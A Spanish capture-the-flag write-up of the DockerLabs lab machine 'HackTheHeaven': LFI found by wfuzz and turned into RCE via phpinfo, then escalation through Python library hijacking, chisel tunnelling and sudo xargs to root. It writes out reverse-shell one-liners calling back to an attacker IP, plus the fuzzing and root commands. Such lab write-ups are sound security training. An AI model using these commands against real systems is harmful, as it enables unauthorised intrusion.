---
title: HackTheHeaven - DockerLabs
published: true
categories: DockerLabs
---

 
| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  | Difícil     | AlbertoMD3        | 


## Reconocimiento

Primero, observamos que el puerto 80 está abierto.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/18af8339-4533-41cd-a2a9-79171e99751a)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/305d8daa-2ffc-4ba3-ade5-0edcb76c3f0d)

Al no encontrar nada relevante, realizamos una búsqueda con `gobuster` para descubrir posibles recursos adicionales. También encontramos un `info.php`, pero no revela información importante.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/415d4514-e42d-4847-8691-fcb4d897711a)

Descubrimos un archivo `idol.html` y procedemos a investigar su contenido.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a000151b-e2e7-4104-8b77-265b32dcb8d1)

La página web contiene un formulario y al hacer clic en el botón, nos redirige a otra página.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/42a7230c-b56d-49d5-a6e4-36bd88039f2b)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/54150e46-157d-4749-8010-69958601cb9d)

Esta página parece susceptible a un ataque LFI (Local File Inclusion). Sin embargo, necesitamos determinar el parámetro correcto para la inyección. Utilizamos `wfuzz` para hacer fuzzing y encontrar dicho parámetro.

```bash
wfuzz -c --hh=53 --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/clouddev3lopmentfile.php?FUZZ=../../../../../../../../../../.../../../etc/passwd"
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/96d1ea0e-05e7-4e07-9247-670cb1767e74)

Encontramos que el parámetro es filename.

Ahora podemos leer archivos del sistema.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/39e054ab-a2aa-4315-b16c-f011dc1d1149)

## Escalada a RCE

Al investigar, descubrimos que podemos convertir un LFI en un RCE. Nos basamos en una guía de HACKTRICKS para lograrlo: LFI to RCE via phpinfo.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ddefc507-946f-42fa-a040-380f9881daa8)

Vamos a comprobar si es posible.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/48079e67-94c4-4e62-b428-c08115916558)


En el script descargado de HACKTRICKS, añadimos nuestra reverse shell en la variable payload. Cambiamos el archivo objetivo a info.php.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1a26653e-92b2-43d8-8abe-d3f1926f7834)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/85fbad4a-b3fe-40f1-88f3-0f32cfea8300)


Modificamos la URL en la sección correspondiente del script.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/d2216996-b557-47f2-b566-aa8f7e778cd2)


(Esta parte fue gracias a Mario :P me estaba volviendo loco con este script).

Ejecutamos el script.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/97fb1b5a-f502-475d-98c4-104fd82e20f0)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/2be9824f-b213-4a26-9522-71b99f5ad3f6)

¡Ya estamos dentro!
Escalada de Privilegios

Hacemos un ls en el directorio home y encontramos lo siguiente:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/2068b663-941c-448b-9d59-2f7464b1a517)


Vemos el texto megustaelfallout, así que probamos acceder como xerosec usando esa contraseña, ya que es el propietario del archivo.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/e3a7c2f3-899a-4adc-92d7-f5afe4058223)


Efectivamente, ahora estamos dentro. Vamos al directorio tmp para ver el script.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0dfc476b-f31b-4d0e-9d91-3a6d0e3c60e8)


Este es el script. Si observamos, importa hashlib directamente, lo que presenta una vulnerabilidad. Si creamos un archivo llamado hashlib.py en el mismo directorio con código Python, este se ejecutará primero debido a la función import.

Además, al hacer un sudo -l, vemos que podemos ejecutar ese script como mario.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c6ddf403-ac13-457d-8b61-7424e8ad02a1)


Creamos un script que ejecute whoami. Si funciona, debería devolver mario.

Lo ejecutamos y...

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f0e66860-687e-4de4-a5df-17a2046f7f23)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/d7a12c27-7eae-43f7-ba08-6bd05a9ae06b)

Efectivamente, whoami devuelve mario. Ahora podemos hacer que ejecute una reverse shell para escalar a mario.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/26b858f2-3ce1-4106-92c7-53d15ceaa517)

Esto nos da una reverse shell como mario.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c15facab-a58c-4e04-89a2-7f6509555e12)

En el escritorio de mario, vemos un archivo que dice lo siguiente:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/82ccca06-3df4-4722-b7f1-283d0be6711a)

Miramos los procesos en ejecución en la máquina.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/374d76e8-01f9-44f4-9de0-aabb5f2aaaac)


Vemos que s4vitar está ejecutando algo en localhost:9999. Vamos a investigar.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/174d11fc-b7d5-4140-9ebe-ab53e086174e)


Si hacemos un curl, vemos que nos pide un comando. Vamos a intentar concatenar lo que dice en el archivo del escritorio.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c4cbc42f-b178-40f7-b20a-de78ff7582c0)


Podemos ejecutar comandos desde la terminal. Vamos a pasarle el típico one-liner para hacer una reverse shell:

```
bash -i >& /dev/tcp/172.17.0.1/4333 0>&1
```
Nos llega la conexión, pero no podemos conectarnos directamente. Vamos a descargar chisel en la máquina atacante

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0e546861-8ba1-4fdc-84da-b64c9d7e6f12)

- Maquina atacante
```
./chisel server --reverse 1234
```
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/fb5da496-b18f-4886-8f0b-1c8518eb8766)

Nos quedamos a la escucha para el túnel que vamos a crear.


Usamos python para subir el archivo de chisel a la máquina víctima en la carpeta tmp.

- Maquina Victima
```
./chisel client 172.17.0.1:8080 R:9999:127.0.0.1:9999
```
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/43b0b7fa-8a39-416a-a362-527385c0eae4)


Le decimos a chisel que el tráfico de localhost en el puerto 9999 lo redirija a la IP 172.17.0.1. Ahora, si ponemos en el navegador de la máquina atacante localhost:9999, veremos la página web de la máquina víctima de s4vitar.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/519a2f27-dd75-4a64-bfb2-5bdedc82ebbe)


Pasamos el one-liner de la reverse shell cambiando los & por %26 para que funcione:

```
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4333 0>%261"
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/bbfee5f3-6b4c-4f43-803f-b7b65af25c61)

Ahora hacemos un sudo -l.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/6aa881d8-67f8-4c87-9b14-d9e9472615b2)


Podemos ejecutar xargs como root. Usamos gtfobins para encontrar cómo escalar privilegios con xargs.

```
./xargs -a /dev/null sh -p
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ebbc0488-556d-4698-a906-e4d4a1a1cda9)

¡Nos convertimos en root!

